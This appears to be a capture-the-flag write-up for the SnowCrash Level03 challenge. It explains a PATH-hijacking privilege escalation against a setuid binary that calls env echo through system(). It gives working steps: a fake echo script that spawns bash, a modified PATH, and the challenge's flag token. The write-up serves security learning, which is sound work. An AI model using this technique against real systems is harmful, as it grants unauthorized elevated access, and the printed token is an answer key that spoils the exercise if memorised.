# Level03 Solution

## Starting VM

```bash
qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio -net user,hostfwd=tcp::4242-:4242
```

## Objective
Exploit a setuid binary to gain access to the `flag03` account and retrieve the password token.

## Vulnerability Analysis

### The Binary
The `level03` binary is a setuid executable owned by `flag03`:
```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

When executed, it runs with `flag03` privileges (UID/GID).

### The Vulnerability: PATH Manipulation via `env`

The binary executes the following command via `system()`:
```
/usr/bin/env echo Exploit me
```

This is vulnerable because:

1. **`/usr/bin/env` searches PATH**: The `env` utility searches for the `echo` command in the directories listed in the `PATH` environment variable
2. **`system()` respects environment variables**: The `system()` function spawns `/bin/sh` which respects the `PATH` variable
3. **User can modify PATH**: Even though the binary is setuid, the shell still uses the user's `PATH` environment
4. **No absolute path to echo**: The binary doesn't use an absolute path like `/bin/echo`, making it vulnerable to PATH manipulation

### Attack Vector

By crafting a malicious `echo` script in a directory we control and setting `PATH` to search our directory first, we can hijack the command execution to run arbitrary code with `flag03` privileges.

## Exploit Steps

### Step 1: Create Exploit Directory
```bash
mkdir -p /tmp/level03_exploit
```

### Step 2: Create Malicious Echo Script
```bash
echo '#!/bin/bash' > /tmp/level03_exploit/echo
echo '/bin/bash' >> /tmp/level03_exploit/echo
chmod +x /tmp/level03_exploit/echo
```

This creates a fake `echo` that launches an interactive bash shell instead of echoing text.

### Step 3: Modify PATH and Execute
```bash
export PATH=/tmp/level03_exploit:$PATH
~/level03
```

When `~/level03` runs:
1. It calls `system("/usr/bin/env echo Exploit me")`
2. `/bin/sh` searches for `echo` in PATH
3. Finds our malicious script in `/tmp/level03_exploit/echo` first
4. Executes our script with `flag03` privileges
5. We get a bash shell as `flag03`

### Step 4: Retrieve the Flag
```bash
getflag
```

Output:
```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

## Security Flaws

1. **Insecure use of `system()` with relative/searchable commands**: Using `system()` with commands that depend on PATH is dangerous in setuid programs
2. **No PATH sanitization**: The program doesn't set a safe PATH or use absolute paths
3. **Trust in environment variables**: Setuid programs should never trust user-controlled environment variables

## Answer

**Level03 Token (password for level04)**: `qi0maab88jeaj46qoumi7maus`
- **Vulnerability Type**: PATH Manipulation / Arbitrary Code Execution via setuid binary
- **Attack Type**: Privilege Escalation through environment variable manipulation
